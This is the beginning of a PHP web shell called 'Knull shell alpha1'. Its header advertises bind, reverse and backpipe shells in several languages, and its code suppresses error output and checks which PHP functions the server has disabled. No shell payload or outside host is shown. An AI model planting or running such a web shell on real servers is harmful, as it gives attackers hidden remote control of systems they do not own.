<?php
/*

Knull shell alpha1

Authored by Knull of http://leethack.info

Project homepage: https://code.google.com/p/knull-shell/

Features:

Contains PHP web frontend
Contains newer bind/reverse/backpipe shells in PHP/Python/Perl, Telnet/Netcat backpipes

Disclaimer: any use of this software on a computing device can only be used with explicit permission 
from the computers rightful owner, I cannot be held responsible for the consequences of your actions.

*/

error_reporting(0);

// check for disabled PHP functions

$disabled_funcs=@ini_get('disable_functions');
if(!empty($disabled_funcs)){ 
	$disabled_funcs=preg_replace('/[, ]+/', ',', $disabled_funcs);
	$disabled_funcs=explode(',', $disabled_funcs);
	$disabled_funcs=array_map('trim', $disabled_funcs); 
}else{ 
	$disabled_funcs=array(); 
}

?>